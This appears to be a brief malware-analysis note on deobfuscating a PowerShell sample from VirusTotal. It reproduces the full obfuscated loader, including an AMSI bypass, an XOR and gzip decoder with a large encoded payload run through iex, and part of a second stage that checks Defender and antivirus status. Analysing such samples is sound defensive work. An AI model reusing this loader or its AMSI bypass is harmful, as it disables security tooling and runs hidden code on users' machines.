---
tags: PowerShell-Analysis
---
## Analysing Obfuscated PowerShell Scripts

Some examples of how we can easily and quickly deobfuscate certain PowreShell scripts

The below sample was taken from: https://www.virustotal.com/gui/file/00bceb818c4ca7effb1867160c34265b43ac9bf6a7fdd526e4324f386984e284


```powershell
set-alias 7boh6i0n $([char](171-56)+[char](213-112)+[char](215-99)+[char](99-54)+[char](218-121)+[char](158-50)+[char](162-57)+[char](195-98)+[char](225-110))
$4n29yu5zl7rd60o = $executioncontext
$mk2ebor4cw169tf=$([char](226-121)+[char](223-113)+[char](225-107)+[char](160-49)+[char](163-56)+[char](222-121)+[char](199-100)+[char](228-117)+[char](220-111)+[char](227-118)+[char](147-50)+[char](161-51)+[char](198-98))
$5pzm1crilq8f0x3=$([char](153-52)+[char](226-106)+[char](217-105)+[char](154-57)+[char](223-113)+[char](213-113)+[char](235-120)+[char](228-112)+[char](234-120)+[char](155-50)+[char](208-98)+[char](154-51))
[Ref].Assembly.GetType($4n29yu5zl7rd60o.$mk2ebor4cw169tf.$5pzm1crilq8f0x3($([char](187-104)+[char](236-115)+[char](216-101)+[char](167-51)+[char](150-49)+[char](166-57)+[char](96-50)+[char](133-56)+[char](213-116)+[char](164-54)+[char](150-53)+[char](210-107)+[char](205-104)+[char](225-116)+[char](200-99)+[char](228-118)+[char](230-114)+[char](144-98)+[char](113-48)+[char](234-117)+[char](219-103)+[char](215-104)+[char](221-112)+[char](203-106)+[char](237-121)+[char](220-115)+[char](167-56)+[char](214-104)+[char](96-50)+[char](166-101)+[char](157-48)+[char](167-52)+[char](205-100)+[char](198-113)+[char](229-113)+[char](223-118)+[char](157-49)+[char](163-48)))).GetField($4n29yu5zl7rd60o.$mk2ebor4cw169tf.$5pzm1crilq8f0x3($([char](218-121)+[char](166-57)+[char](171-56)+[char](218-113)+[char](122-49)+[char](210-100)+[char](154-49)+[char](217-101)+[char](120-50)+[char](149-52)+[char](223-118)+[char](226-118)+[char](221-120)+[char](208-108))),$4n29yu5zl7rd60o.$mk2ebor4cw169tf.$5pzm1crilq8f0x3($([char](196-118)+[char](165-54)+[char](159-49)+[char](185-105)+[char](232-115)+[char](216-118)+[char](221-113)+[char](224-119)+[char](220-121)+[char](155-111)+[char](133-50)+[char](165-49)+[char](149-52)+[char](238-122)+[char](223-118)+[char](211-112)))).SetValue($twuj2ck7gd5olqi,$true);

$lpyrms4iad35oqz = [System.Text.Encoding]::ascii
function xbm7hc6u2dae0swtr83lpoj59qv  {param($04x69y3kzgap5no )
  $riw7fqxhg9dyekj = [System.Convert]::FromBase64String($04x69y3kzgap5no)
  $wf17e4am0x2vjht= $lpyrms4iad35oqz.GetBytes("h8eo93iagp1j")
    $warxo2t3e4z7h6b = $riw7fqxhg9dyekj
    $wnzl7sucxrm963k = $(for ($oxk7wrh9pcyugz3 = 0; $oxk7wrh9pcyugz3 -lt $warxo2t3e4z7h6b.length; ) {
        for ($sc2rqfmdkwx57bt = 0; $sc2rqfmdkwx57bt -lt $wf17e4am0x2vjht.length; $sc2rqfmdkwx57bt++) {
            $warxo2t3e4z7h6b[$oxk7wrh9pcyugz3] -bxor $wf17e4am0x2vjht[$sc2rqfmdkwx57bt]
            $oxk7wrh9pcyugz3++
            if ($oxk7wrh9pcyugz3 -ge $warxo2t3e4z7h6b.Length) {
                $sc2rqfmdkwx57bt = $wf17e4am0x2vjht.length
            }
        }
    })
	$ywcg3mt1zbioj0u = New-Object System.IO.MemoryStream( , $wnzl7sucxrm963k )

	    $wot04yng9apvqkr = New-Object System.IO.MemoryStream
        $f4desboqitlg8m1 = New-Object System.IO.Compression.GzipStream $ywcg3mt1zbioj0u, ([IO.Compression.CompressionMode]::Decompress)
	    $f4desboqitlg8m1.CopyTo( $wot04yng9apvqkr )
        $f4desboqitlg8m1.Close()
		$ywcg3mt1zbioj0u.Close()
		[byte[]] $oew1b95vq2sm4hj = $wot04yng9apvqkr.ToArray()
 $95uh03bdaycgxom=$oew1b95vq2sm4hj
    return $95uh03bdaycgxom
}

[System.Text.Encoding]::ascii.GetString((xbm7hc6u2dae0swtr83lpoj59qv "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"))|iex;
```

By changing the final "iex" and changing with "write-host", we get the following output when executed in PowerShell:

```powershell
$global:cijpehml=$executioncontext;$rltcazv=(Get-MpComputerStatus).($global:cijpehml.([char[]]@((-1414+(-3700+(36621723/7017))),(696960/6336),(-4969+(5694-607)),(-5910+(11602467/(1880752/(7881200/8075)))),(-9715+9822),(-8458+8559),(-1832+1931),(4435-(9119316/(-7133+9242))),(6772-(3468+(1663+(5797088/3784)))),(-1894+2003),(5460-(19510594/(6989-3351))),(-8190+8300),(914-(2821-2007))) -join '').([char[]]@((861732/8532),(-9603+9723),(-5515+(12086796/2148)),(610-(8175-7662)),(-5451+(-1251+(6487+(2028975/(13184-6941))))),(270700/(24430675/(7217+(12097328/(16048-9357))))),(-1788+(-7200+9103)),(6691-6575),(6474-6360),(746655/7111),(3522-3412),(4705-4602)) -join '')(-join (@( (87381/1197),(3710-(7618-(-4747+(4211+(7089-(9309-6779)))))),(3201-(27910400/8960)),(9627-9522),(-8218+8332),(406-(981070/(4980-1597))),(-8284+8401),(2982-(-7052+9937)),(739044/6843),(-2660+(-7014+9751)),(-1253+(-1920+(3092+178))),(-6379+(52568970/(6915+1200))),(567320/5455),(-143+248),(9494-9384),(871731/(9328-(-5765+6462))))| ForEach-Object { [char]$_ })))
switch($true){
        {$rltcazv -eq $false} {$cvjqdh+= ((8433534786-(12221760/4390))+(11196-(2103+7865))); break; }
        {$rltcazv -eq $true} {$cvjqdh+= ((35161740796805-5238)/((-7082+2755)+((33660461-9269)/((37903403-(5734-1916))/(15113-(977+(20764701/2381))))))); break; }
        {$rltcazv -eq ((46289715/(12086-3741))/(-6392+(2793699/(-8002+(1366+(10124-3149))))))} {$cvjqdh+= ((12094087256-(5976-248))+((5891027+7436)/((11891229/3669)+(8642-(12692-5428))))); break; }
}
$rpbjlte=((Get-WmiObject  $global:cijpehml.([char[]]@((-734+839),(873840/7944),(-8052+(4640+3530)),(9966-(2882+6973)),(867235/(66995930/8266)),(-3750+3851),(904365/(15721-6586)),(-9379+9490),(284599/(3176-565)),(785781/7209),(429807/4431),(-250+(3520-3160)),(5046-(-989+(5644185/951)))) -join '').([system.String]::new(@((89587/887),(993840/8282),(389-277),(815576/8408),(969100/8810),(7058-6958),(-5970+(14932590/(-6926+9380))),(-446+(4988-4426)),(57570/(8262-(15000-(7847-604)))),(6165-6060),(9357-9247),(-773+876))))(-join (@( (-461+548),(965790/(8552+(-8573+(29620647/3213)))),(702240/(5209+(10916-(1188+8553)))),(-3152+(5960783/(-4745+(9608-(-4855+(13019049/(6571-4914))))))),(-4625+(42271350/9042)),(786125/(5099+3176)),(3479-3393),(-7249+(2940+(-676+5090))),(-7206+(14036-6730)),(-2247+2348),(-1039+1150),(590471/8813),(5028-(2388+(4255-1726))),(524040/(7636-(3786-914))),(8284-(54170176/6632)),(1092918/9587),(-868+979),(7420-(9106-1794)),(-7938+(6704+1342)),(4926-(2094050/(-8715+9149))),(457596/4014))| ForEach-Object { [char]$_ })) | Select-Object $global:cijpehml.([system.String]::new(@((-461+566),(-8397+8507),(-8252+8370),(228771/(533799/(502201/(19137930/(5739+4131))))),(97263/909),(264721/(3941984/(6685-(11505-(5284+1040))))),(2244-(-1951+4096)),(333666/3006),(11554/(-2173+2279)),(8853-(3351+(15530-(55956240/5520)))),(-6280+6377),(-5554+(-1877+(74738851/9911))),(801000/8010)))).(-join (@((857288/(62284944/7338)),(5969-5849),(1456-(-1342+2686)),(718188/7404),(840400/7640),(167300/(8547-(16478-9604))),(880440/7656),(9501-(19052-(19861-10194))),(-9253+(18911-9544)),(256095/2439),(208-(212660/(-2620+4790))),(2255-2152))| ForEach-Object { [char]$_ }))([char[]]@( (150280/2312),(-7192+(12600-5308)),(3838-3741),(7100-(5318+(-289+(444693/(1845737/8131))))),(928-(5620-4808)),(50601/501),(6893-6779),(7470-(26129060/(3353500/950))),(-2730+2795),(441731/(21394285/(5714445/(2790-1029)))),(9377-(5482+3811)),(5084-(8829-3866)),(79072/(3555416/5036)),(-9845+9946)) -join '')) | Out-String)
switch($true){
        {$rpbjlte -match $global:cijpehml.(-join (@((911715/8683),(-8408+(14153-(12633-(45375032/6484)))),(-1419+1537),(1140-1029),(675-(-7678+(17434-(5384+3804)))),(155843/1543),(553311/5589),(-10133+(3703+6541)),(-4237+4346),(-1128+(7120172/5756)),(612846/(13083-(68326500/(40521200/(18607656/(4086+552)))))),(565-(7274-6819)),(6270-6170))| ForEach-Object { [char]$_ })).([char[]]@((807192/(72607320/(55191375/6075))),(212-(241040/(13160260/(19323481/(9709828/2524))))),(687904/(59669530/(6903+2812))),(8846-8749),(-5318+(8008-(2820-240))),(1607-1507),(893780/(2463+5309)),(5928-5812),(-9346+(68007940/(15032199/(12414267/(14130-(16763-(44778250/(10275-5050)))))))),(-6939+(7790664/(-7995+(9144-43)))),(307230/2793),(8704-(18574-(20201-10228)))) -join '')(-join (@( (-4739+(-4002+8827)),(-2296+(9631-7258)),(714-595),(305-(551616/2652)),(314184/2756),(789820/(10356-(6269-3733))))| ForEach-Object { [char]$_ })) -or $rpbjlte -match $global:cijpehml.([char[]]@((6461-(41968668/(17101770/(14700840/(7039-1363))))),(478500/4350),(619618/(7747-2496)),(1028415/9265),(1076099/10057),(513-412),(4468-4369),(3952-3841),(-3349+(5148962/1489)),(-7338+7447),(2238-(-117+(2644118/1171))),(5048-(17169426/3477)),(900300/9003)) -join '').([char[]]@((7358-(28273272/(11210-(9786-(-6758+(62440950/6765)))))),(870960/7258),(6931-6819),(-707+804),(87890/(4753251/5949)),(986700/(2659+7208)),(7365-7250),(-1164+1280),(8767-8653),(-988+1093),(411400/3740),(-1861+(11126-(15059-5897)))) -join '')([char[]]@( (-7511+(76633778/10114)),(124875/1125),(-3141+3240),(656240/(3543+2767)),(-3668+3783)) -join '')} {$cvjqdh+= ((473553611511187+(68043402/(35068194/4926)))/(-1308+9715)); break; }
        {$rpbjlte -match $global:cijpehml.(-join (@((858795/8179),(1663-1553),(-7149+(7353-(5053-(25679390/(-3754+(11287-2363)))))),(970251/8741),(962251/(23759506/(7820-(32828520/(27458540/4331))))),(451672/4472),(4356-4257),(-2442+2553),(-5133+5242),(-6899+7008),(4254-(17264021/4153)),(-5366+5476),(1538-1438))| ForEach-Object { [char]$_ })).([system.String]::new(@((8666-(5267+3298)),(6338-(1187+(11817-6786))),(-7398+(59862210/7971)),(804712/8296),(1836-(10542408/(7555596/(6359417/5141)))),(890500/(42272035/4747)),(527850/4590),(2184-(2601-533)),(8036-7922),(5516-5411),(2351-(10485-(65506824/(1409+6537)))),(1641-(-4074+(846+(11076-6310)))))))([system.String]::new(@( (4065-3992),(7376-7266),(-9325+9441),(4397-(13803-9507)),(-3319+3427)))) -or $rpbjlte -match $global:cijpehml.([system.String]::new(@((8935-8830),(-9985+(-32+(14289197/(6379131/(2733+1788))))),(-4678+4796),(4333-(10208-(18694278/(8635095/(-4406+7171))))),(-802+909),(176245/(-5336+(48901386/6906))),(895950/(6009+3041)),(6481-6370),(-8555+8664),(619774/(9843-4157)),(236680/2440),(5179-5069),(-788+888)))).(-join (@((619130/(-3107+(10700-(6456219/(-435+4848))))),(15000/(629000/5032)),(692384/6182),(417779/4307),(-4429+(-3292+(2283+(49438228/(16806146/(17534142/(32000274/(-6695+(9945+(1628928/(51014292/(-2607+(30488940/(1135377/(-9291+(16297-6685)))))))))))))))),(3635-(6958-(5033-1610))),(1168860/10164),(870348/7503),(-4523+4637),(53655/511),(-1082+1192),(3263-3160))| ForEach-Object { [char]$_ }))([char[]]@( (3842-(19813689/(8350-(4200-1121)))),(1744-(-4495+6138)),(769-672),(-9910+9976),(563779/(8098-(1623000/(5011-683)))),(-4067+(37218642/(12964-3987))),(684999/8253)) -join '')} {$cvjqdh+= ((72480679231-4950)-((7961240-3076)/(8043+(7620587/8203)))); break; }
        {$rpbjlte -match $global:cijpehml.([char[]]@((316575/(21349215/7081)),(1358-(4246-(24643560/(6639+(15090645/(9812260/(-5569+(31487481/(9151-4378))))))))),(510114/(-2122+6445)),(-5072+5183),(-7708+(8857-1042)),(600647/5947),(770814/(3339+4447)),(10232-(1822+8299)),(4086-3977),(-2193+(-4923+7225)),(-8916+9013),(6937-(6641+186)),(265200/(6816-4164))) -join '').(-join (@((8153-(76292700/9475)),(19440/(-9383+(14158-4613))),(-7750+(16041-8179)),(-7966+8063),(647-(-278+(6182-(50100945/9335)))),(3740-3640),(187910/1634),(-5357+(9754-4281)),(3549-3435),(1496-(12096136/8696)),(780010/(11834879/(-6489+8158))),(1659-(7348-(4014+1778))))| ForEach-Object { [char]$_ }))(-join (@( (-5241+(11876-(59386100/(15411-6361)))),(5899-(47255607/8163)),(-7827+(1058+(-536+(13231-5810)))),(942431/(20388235/(13147145/6017))),(8637-(1004+(3327+(2378+1814)))),(3334-(4036-(5357576/(951+5647)))),(4262-4165),(914868/8471))| ForEach-Object { [char]$_ })) -or $rpbjlte -match $global:cijpehml.([char[]]@((-2222+2327),(69300/(32130/(-10168+(20137-(338+9580))))),(-7506+(13150-5526)),(3161-(10023-6973)),(-3116+3223),(134027/1327),(5596-(13981-8484)),(537684/(885+(9652042/2438))),(-2213+2322),(1227-1118),(969612/(79208304/7924)),(242660/(-3172+(-3121+8499))),(9730-(3236+6394))) -join '').(-join (@((2255-(10111-7957)),(-3054+(-1563+(38355489/8097))),(-3198+(-2718+(32352276/5367))),(-7308+7405),(2154-2044),(-7559+7659),(-9791+9906),(-2010+2126),(-5628+5742),(384510/3662),(915310/8321),(525712/5104))| ForEach-Object { [char]$_ }))([system.String]::new(@( 